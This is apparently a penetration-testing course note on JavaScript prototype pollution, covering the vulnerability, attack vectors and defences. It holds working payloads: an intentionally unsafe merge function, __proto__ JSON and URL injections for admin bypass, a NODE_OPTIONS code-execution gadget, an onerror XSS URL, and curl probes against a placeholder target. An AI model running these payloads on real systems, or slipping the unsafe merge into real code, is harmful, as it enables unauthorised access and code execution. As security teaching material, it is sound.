---
tags: [vapt, injection, advanced]
difficulty: advanced
module: "10 - Injection Attacks"
topic: "10.18 Prototype Pollution (JavaScript)"
---

# 10.18 — Prototype Pollution (JavaScript)

## What is Prototype Pollution?

Prototype Pollution is a JavaScript vulnerability where an attacker can modify `Object.prototype` — the base object from which ALL JavaScript objects inherit. By injecting properties into the prototype, attackers affect all objects in the application.

```
HOW JAVASCRIPT INHERITANCE WORKS:
  Every object inherits from Object.prototype:
  let obj = {};
  obj.__proto__ === Object.prototype  // true!
  
  If we add a property to Object.prototype:
  Object.prototype.admin = true;
  
  Now EVERY empty object has admin = true:
  let newUser = {};
  newUser.admin  // → true! (even though we never set it!)
  
  THIS IS PROTOTYPE POLLUTION!
```

---

## How Prototype Pollution Happens

```javascript
// VULNERABLE CODE — DEEP MERGE FUNCTION:
function merge(dst, src) {
  for (let key in src) {
    if (typeof src[key] === 'object') {
      dst[key] = merge(dst[key] || {}, src[key]);
    } else {
      dst[key] = src[key];  // ← DANGEROUS! No key check!
    }
  }
  return dst;
}

// ATTACK:
let malicious = JSON.parse('{"__proto__": {"admin": true}}');
merge({}, malicious);
// → Object.prototype.admin = true now!
// → Every object in the app has admin=true!

// CHECK:
let user = {username: "normal_user"};
user.admin  // → true! (inherited from polluted prototype!)
```

---

## Attack Vectors

```javascript
// 1. VIA JSON.PARSE + PROPERTY ASSIGNMENT:
// If app does: Object.assign(target, JSON.parse(userInput))
// Inject: {"__proto__": {"admin": true}}

// 2. VIA URL PARAMETERS (qs library):
// Vulnerable URL parsing:
// ?__proto__[admin]=true
// ?__proto__[isAdmin]=true
// ?constructor[prototype][admin]=true

// 3. VIA FORM DATA:
// name=test&__proto__[admin]=true

// 4. VIA LODASH _.merge() (was vulnerable in old versions):
_.merge({}, JSON.parse('{"__proto__": {"admin": true}}'));

// IMPORTANT PATHS:
// __proto__ → direct prototype access
// constructor.prototype → constructor's prototype
// prototype → direct prototype object
```

---

## Exploiting Prototype Pollution

### Authentication Bypass

```javascript
// IF APP CHECKS: if (user.admin) { grantAccess(); }
// AND: user object is freshly created from DB

// ATTACK:
// Pollute: Object.prototype.admin = true
// Now: user.admin === true for ALL users!
// Attacker without admin access → gets admin!

// PAYLOAD (in JSON body):
POST /api/settings HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "admin": true
  }
}

// OR:
{
  "constructor": {
    "prototype": {
      "admin": true
    }
  }
}
```

### Server-Side Prototype Pollution → RCE

```javascript
// In Node.js, prototype pollution can lead to RCE via child_process:

// If code does:
// const { exec } = require('child_process');
// const options = {};  // merge user input into options
// exec(cmd, options);

// ATTACK: Pollute 'shell' property of exec options:
// {"__proto__": {"shell": "node", "env": {"NODE_OPTIONS": "--require /proc/self/fd/0"}}}

// MORE DIRECT RCE via NODE_OPTIONS:
// If prototype polluted to set NODE_OPTIONS → code execution on require()!

// GADGET CHAINS:
// Prototype pollution + specific code patterns = RCE!
// Tools like server-side-prototype-pollution automates this
```

### Client-Side Prototype Pollution → XSS

```javascript
// IF CLIENT-SIDE CODE DOES:
// let config = {};
// merge(config, userParams);  ← user controls URL params
// document.querySelector(config.selector).innerHTML = config.content;

// ATTACK URL:
// ?__proto__[selector]=body&__proto__[content]=<img src=x onerror=alert(1)>
// → config.selector = "body", config.content = "<img src=x onerror=alert(1)>"
// → document.querySelector("body").innerHTML = "<img ...>" → XSS!
```

---

## Testing for Prototype Pollution

```bash
# STEP 1: FIND JSON MERGE OPERATIONS:
# Look for: deep merge, configuration updates, settings endpoints

# STEP 2: TEST VIA JSON:
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"__proto__": {"testpollute": 1234}}'

# STEP 3: CHECK IF PROTOTYPE IS POLLUTED:
curl https://target.com/api/profile
# Look for: "testpollute": 1234 in response
# If it appears on objects that shouldn't have it → POLLUTED!

# STEP 4: TEST URL PARAMETER FORM:
curl "https://target.com/api?__proto__[admin]=true"
curl "https://target.com/api?constructor[prototype][admin]=true"

# STEP 5: BURP EXTENSION:
# "Server-Side Prototype Pollution Scanner" Burp extension
# Automatically detects server-side prototype pollution

# CLIENT-SIDE TOOL:
# DOM Invader in Burp browser can detect client-side prototype pollution
```

---

## Defense

```
PROTECTION:
  1. Use Object.create(null) for data objects (no prototype!):
     const data = Object.create(null);  // no __proto__!
  
  2. Freeze Object.prototype:
     Object.freeze(Object.prototype);   // prevent modification!
  
  3. Validate keys in merge operations:
     function safemerge(dst, src) {
       for (let key in src) {
         if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
           continue;  // SKIP DANGEROUS KEYS!
         }
         // ... rest of merge
       }
     }
  
  4. Use Map instead of plain objects for user data:
     const data = new Map();  // doesn't have __proto__ issue!
  
  5. Keep lodash and other libraries updated:
     Lodash < 4.17.12 was vulnerable
     Modern versions are patched
  
  6. Use JSON Schema validation on incoming data:
     Reject schemas that contain __proto__, constructor, prototype keys
```

---

## Related Notes
- [[Module 07 - XSS]] — client-side prototype pollution → XSS
- [[Module 09 - SSTI]] — server-side code execution comparison
- [[Module 08 - Command Injection]] — RCE comparison
- [[Module 07 - API Security]] — API injection testing
